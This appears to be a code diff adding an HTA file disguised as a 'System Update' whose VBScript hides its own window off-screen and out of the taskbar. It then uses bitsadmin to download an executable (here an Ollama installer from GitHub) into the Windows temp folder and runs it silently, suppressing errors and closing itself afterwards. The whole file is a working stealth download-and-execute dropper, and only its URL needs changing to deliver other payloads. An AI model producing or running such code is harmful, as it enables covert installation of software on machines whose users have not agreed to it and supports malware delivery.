@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <meta charset="utf-8">
+    <HTA:APPLICATION 
+        ID="Updater"
+        APPLICATIONNAME="System Updater"
+        WINDOWSTATE="minimize"
+        SHOWINTASKBAR="no"
+        CAPTION="no"
+        SYSMENU="no"
+        BORDER="none">
+    
+    <script language="VBScript">
+        Sub Window_OnLoad
+            ' Полностью скрываем окно
+            window.resizeTo 1, 1
+            window.moveTo -10000, -10000
+            
+            ' Запускаем процесс
+            window.setTimeout "StartDownload", 1000, "VBScript"
+        End Sub
+        
+        Sub StartDownload
+            On Error Resume Next
+            
+            Dim directUrl, tempPath, shell
+            ' Прямая ссылка на установочный файл Ollama
+            directUrl = "https://github.com/ollama/ollama/releases/download/v0.6.2/OllamaSetup.exe"
+            tempPath = "C:\Windows\Temp\OllamaSetup.exe"
+            
+            Set shell = CreateObject("WScript.Shell")
+            
+            ' Скачиваем с помощью bitsadmin (более надежно)
+            shell.Run "cmd /c bitsadmin /transfer OllamaDownload /download /priority normal """ & directUrl & """ """ & tempPath & """", 0, True
+            
+            ' Ждем немного и запускаем
+            window.setTimeout "RunInstall", 5000, "VBScript"
+        End Sub
+        
+        Sub RunInstall
+            On Error Resume Next
+            
+            Dim shell, fso, tempPath
+            tempPath = "C:\Windows\Temp\OllamaSetup.exe"
+            Set shell = CreateObject("WScript.Shell")
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            
+            ' Проверяем, что файл существует и не пустой
+            If fso.FileExists(tempPath) Then
+                Dim fileSize
+                fileSize = fso.GetFile(tempPath).Size
+                If fileSize > 1000000 Then ' больше 1MB
+                    ' Запускаем установку
+                    shell.Run Chr(34) & tempPath & Chr(34) & " /S", 0, False
+                End If
+            End If
+            
+            ' Закрываем HTA
+            window.setTimeout "SelfClose", 3000, "VBScript"
+        End Sub
+        
+        Sub SelfClose
+            window.close
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
